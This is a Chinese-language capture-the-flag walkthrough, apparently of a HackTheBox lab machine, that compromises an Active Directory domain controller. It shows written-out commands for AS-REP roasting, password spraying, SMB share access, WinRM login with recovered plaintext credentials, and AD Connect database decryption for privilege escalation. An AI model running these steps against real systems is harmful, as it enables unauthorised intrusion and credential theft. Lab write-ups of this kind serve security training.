发现可以不登陆扫描到相应用户名，其中有一些是默认的服务名称，根据开放的端口服务，目标服务器是一台DC服务器，所以可以考虑使用我们收集的用户名，针对DC服务器没有开启预认证的账户进行扫描，执行SPN roasting攻击，获取对应的hash值

```
impacket-GetNPUsers megabank.local/ -usersfile users.txt -dc-ip 10.10.10.172
```

![image-20241022155630141](https://s2.loli.net/2024/10/22/iVKMBJctEZjgWmv.png)

经过扫描检查所有的用户均未存在问题，但可以确定有几个用户肯定存在

```
MONTEVERDE$
AAD_987d7f2f57d2
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```

在没有其他更好的思路之前，我们考虑是否可能存在用户名是密码的情况，故复制users.txt为password.txt，使用netexec进行验证

```
netexec smb 10.10.10.172 -u users.txt -p passwords.txt
```

![image-20241022161953212](https://s2.loli.net/2024/10/22/9YaZRK7xJwdzByh.png)

还真发现了一个用户，使用了和用户名一样的密码，根据验证的smb可用，优先登录smb查看内容

```
smbclient //10.10.10.172/users$ -U SABatchJobs
```

![image-20241022164341221](https://s2.loli.net/2024/10/22/D3KeQi4PtGydTB5.png)

在mhope目录下发现一个azure.xml文件，下载进行查看

![image-20241022164430406](https://s2.loli.net/2024/10/22/omtD84pI9s5QCgS.png)

获取到一个密码

```
user：mhope
pass:4n0therD4y@n0th3r$
```

考虑到获取到这个文件的目录名称，尝试进行登陆验证

```
netexec winrm 10.10.10.172 -u "mhope" -p '4n0therD4y@n0th3r$'
```

![image-20241022165843514](https://s2.loli.net/2024/10/22/M93ZUJlqwrpkTuR.png)

使用evil-winrm进行登录

```
evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```

成功突破边界，在对应的文件夹内获取对应的flag内容

![image-20241022170010391](https://s2.loli.net/2024/10/22/6B9OvRdYymoPal2.png)

接下来我们需要进行提权，我们根据获取的账号密码通过bloodhound进行信息收集，我们可用看到我们的用户属于几个组，其中就有一个azure admin组

同时我们在desktop目录下看到一个PS脚本，经过查看是连接Azure的本地脚本，通过google搜索相应关键字“ADConnect exploit”，发现以下这篇文章（https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/）

根据提示，优先将GitHub中的exe和dll文件进行上传

```
cd "C:\\Program Files\Microsoft Azure AD Sync\Bin"
C:\Users\mhope\Documents\AdDecrypt.exe -FullSQL
```

![image-20241022182605514](https://s2.loli.net/2024/10/22/9lshOFnr87tM1vQ.png)

通过这个漏洞我们获取到了administrator的账号密码，可用进行登录

```
evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
```
